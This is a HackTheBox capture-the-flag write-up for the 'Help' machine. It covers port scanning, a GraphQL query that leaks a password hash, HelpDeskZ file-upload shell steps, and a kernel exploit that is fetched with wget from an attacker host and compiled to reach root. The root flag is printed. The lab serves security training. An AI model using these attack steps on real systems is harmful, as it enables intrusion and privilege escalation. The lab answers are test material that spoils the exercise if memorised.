---
title: "HackTheBox: Help Write Up!"
date: 2019-04-02
tags: [Hackthebox, ctf, writeup, Help]
excerpt: "HackTheBox: Help Write Up!"
header:
  image: "assets/images/hackthebox-images/carrier-hackthebox-header.png"

---

# Enumeration:

## Nmap:

```console
root@HassanKhan:~# nmap -p- 10.10.10.121 --max-retries 0 -o help-max.nmap
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-21 14:42 EST
Warning: 10.10.10.121 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.121
Host is up (0.21s latency).
Not shown: 38798 filtered ports, 26735 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```console
root@HassanKhan:~# nmap -p- 10.10.10.121 -T4 -Pn -o help-all.nmap
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-21 14:43 EST
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.40% done; ETC: 14:54 (0:10:52 remaining)
Warning: 10.10.10.121 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.121
Host is up (0.22s latency).
Not shown: 65525 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
3000/tcp  open     ppp
8095/tcp  filtered unknown
15523/tcp filtered unknown
17954/tcp filtered unknown
17965/tcp filtered unknown
43723/tcp filtered unknown
60785/tcp filtered unknown
62421/tcp filtered unknown
```

## Fetching credentials from graphql Port 3000:

Index page:

```console
root@HassanKhan:~# curl "http://10.10.10.121:3000/" && echo -e "\n"
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```

I ran dirsearch and was able to find the endpoing query. After looking at the syntax of graphql that how it works, I was finally able to query the right syntax and was able to fetch credentials from that.

```console
root@HassanKhan:~# curl -s "http://10.10.10.121:3000/graphql?query=query%20%7B%20%0A%20%20user%7Busername:password%7D%0A%7D&variables=%7B%7D" | jq
{
  "data": {
    "user": {
      "username": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```
Decrypt the md5 hash:

5d3c93182bb20f07b994a7f617e99cff : godhelpmeplz

Additionally, I have used extension that helped me to query the right syntax of graphql. That extension is “Altair Graphql Client”.

## Port 80:

Nikto scan:

```console
root@HassanKhan:~# nikto -h 10.10.10.121

Nikto v2.1.6/2.1.5
Target Host: 10.10.10.121
Target Port: 80
GET Server leaks inodes via ETags, header found with file /, fields: 0x2c37 0x57ff4a041d89c
GET The anti-clickjacking X-Frame-Options header is not present.
GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
OSVDB-3268: GET /admin/: Directory indexing found.
OSVDB-3092: GET /admin/: This might be interesting...
GET Cookie PHPSESSID created without the httponly flag
GET Cookie lang created without the httponly flag
OSVDB-3092: GET /support/: This might be interesting...
OSVDB-3233: GET /icons/README: Apache default file found.
```

Nothing interesting expect the /admin/ directories. Running dirsearch on port 80 brought /support/
 directory in front of me which was helpdeskz.

 Looking if there's any exploit available for the helpdeskz.

## Exploitation:

Searching for public exploits:

```console
root@HassanKhan:~# searchsploit helpdeskz
HelpDeskZ 1.0.2 - Unauthenticated Arbitrary File Upload
HelpDeskZ < 1.0.2 - Authenticated SQL Injection / Unauthorized File
```

 So we found 2 exploits so far. great! As, helpdeskz is open-source, we can check that how does file upload work.
 @ https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/view_tickets_controller.php

 To made the exploit work, I had to do some modifications in the exploit that were:
 + adjusting the time that is
 currentTime = int(time.time() + 7200) and
 + changing the loop
 for x in range(0, 500): // 500 all most 8 mins

You have to do modifications to the exploit code according to the difference between your time and the server response time. anyways, this could be done manually as well. Manual steps will be:

+ Uploaded php file splint3r7.php
+ Extracted the data header from response
+ converted the date header into seconds timestamp
@ https://www.epochconverter.com/
+ converted md5(filename.phptimestamp)
+ Found the shell on server with directory:
+ 10.10.10.121/support/uploads/tickets/md5string.php

Finally got the user flag!

## Privilege Escalation:

```console
$ uname -a
linux 4.4.0-116-generic
```

Exploit:
@ https://www.exploit-db.com/exploits/44298

```console
help@help:/tmp$ wget 10.10.14.49:1330/exploit1337.c
help@help:/tmp$ gcc exploit1337.c -o exploit1337h
gcc exploit1337.c -o exploit1337h
help@help:/tmp$ ./exploit1337h
./exploit1337h
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
cd /root/
ls -la
cat root.txt
b7fe6082dcdf0c1b1e02ab0d9daddb98
```

And we just owned the root ;)
